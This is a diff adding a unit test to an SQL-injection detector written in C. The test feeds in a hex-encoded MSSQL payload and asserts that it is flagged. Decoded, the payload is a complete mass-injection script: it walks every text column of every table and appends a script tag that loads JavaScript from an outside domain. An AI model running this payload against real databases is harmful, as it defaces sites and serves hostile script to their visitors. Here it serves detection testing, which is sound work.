@@ -564,6 +564,52 @@ Tsqli_delete(void)
     CU_ASSERT_EQUAL(detect_close(detect), 0);
 }
 
+static void
+Tsqli_buf(void)
+{
+    struct detect *detect;
+    uint32_t attack_types;
+
+    CU_ASSERT_PTR_NOT_NULL_FATAL(detect = detect_open("sqli"));
+    CU_ASSERT_EQUAL(detect_start(detect), 0);
+    CU_ASSERT_EQUAL(
+        detect_add_data(detect,
+                        STR_LEN_ARGS("SELECT 0x4445434C415245204054207661726368"
+                                     "617228323535292C4043207661726368617228343"
+                                     "0303029204445434C415245205461626C655F4375"
+                                     "72736F7220435552534F5220464F522073656C656"
+                                     "37420612E6E616D652C622E6E616D652066726F6D"
+                                     "207379736F626A6563747320612C737973636F6C7"
+                                     "56D6E73206220776865726520612E69643D622E69"
+                                     "6420616E6420612E78747970653D27752720616E6"
+                                     "42028622E78747970653D3939206F7220622E7874"
+                                     "7970653D3335206F7220622E78747970653D32333"
+                                     "1206F7220622E78747970653D31363729204F5045"
+                                     "4E205461626C655F437572736F722046455443482"
+                                     "04E4558542046524F4D20205461626C655F437572"
+                                     "736F7220494E544F2040542C4043205748494C452"
+                                     "8404046455443485F5354415455533D3029204245"
+                                     "47494E20657865632827757064617465205B272B4"
+                                     "0542B275D20736574205B272B40432B275D3D2727"
+                                     "223E3C2F7469746C653E3C7363726970742073726"
+                                     "33D22687474703A2F2F777777302E646F7568756E"
+                                     "716E2E636E2F63737273732F772E6A73223E3C2F7"
+                                     "363726970743E3C212D2D27272B5B272B40432B27"
+                                     "5D20776865726520272B40432B27206E6F74206C6"
+                                     "96B6520272725223E3C2F7469746C653E3C736372"
+                                     "697074207372633D22687474703A2F2F777777302"
+                                     "E646F7568756E716E2E636E2F63737273732F772E"
+                                     "6A73223E3C2F7363726970743E3C212D2D2727272"
+                                     "94645544348204E4558542046524F4D2020546162"
+                                     "6C655F437572736F7220494E544F2040542C40432"
+                                     "0454E4420434C4F5345205461626C655F43757273"
+                                     "6F72204445414C4C4F43415445205461626C655F4"
+                                     "37572736F72"), true), 0);
+    CU_ASSERT_EQUAL(detect_has_attack(detect, &attack_types), 1);
+    CU_ASSERT_EQUAL(detect_stop(detect), 0);
+    CU_ASSERT_EQUAL(detect_close(detect), 0);
+}
+
 int
 main(void)
 {
@@ -602,6 +648,7 @@ main(void)
         {"string", Tsqli_string},
         {"use", Tsqli_use},
         {"delete", Tsqli_delete},
+        {"buf", Tsqli_buf},
         CU_TEST_INFO_NULL
     };
     CU_SuiteInfo suites[] = {
